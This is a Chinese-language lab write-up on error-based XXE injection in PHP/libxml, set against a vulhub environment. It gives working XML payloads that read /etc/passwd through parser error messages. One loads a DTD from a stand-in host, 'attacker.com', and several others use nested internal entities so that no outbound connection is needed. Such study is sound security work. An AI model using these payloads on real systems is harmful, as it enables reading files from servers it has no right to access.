## 报错XXE

环境:
- https://github.com/vulhub/vulhub/tree/master/php/php_xxe
- libxml<=2.8(2.9以后默认不使用外部实体)
- 开启了报错
- 无回显

XXE攻击中一般有引入外部实体进行攻击。
```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
    %ext;
]>
<message></message>
```
ext.dtd
```dtd
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```
可以攻击成功。
但是如果目标无法连接外部网络时。如何进行攻击呢？


如果我们把`<!ENTITY %......dtd">%ext;`的内容替换为ext.dtd的内容。有以下：
```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
	%eval;
	%error;
]>
<message></message>
```
可以得到报错：` PEReferences forbidden in internal subset in Entity`
问题出在`file`前面的`%`，我们把%替换成`&#x25`有
```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % eval "
		<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/&#x25;file;'
		>
	">
%eval;
%error;
]>
<message></message>
```
报错` DOMDocument::loadXML(): Invalid URI: file:///nonexistent/%file; in Entity, line: 1 in <b>/var/www/html/dom.php`
我们发现`%file`,那如果把`eval`实体再嵌套再一个内部实体不就可以执行了嘛。
如下：
```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % a '
		<!ENTITY &#x25; b "
			<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;
			>
		">
	'>
%a;
%b;
]>
<message>asfddasfd</message>
```

phit0on师傅在其小密圈中的payload:
```xml
<?xml version="1.0" ?>
<!DOCTYPE message [
    <!ENTITY % condition '
        <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
        <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
        &#x25;eval;
        &#x25;error;
'>
    %condition;
]>
<message>any text</message>
```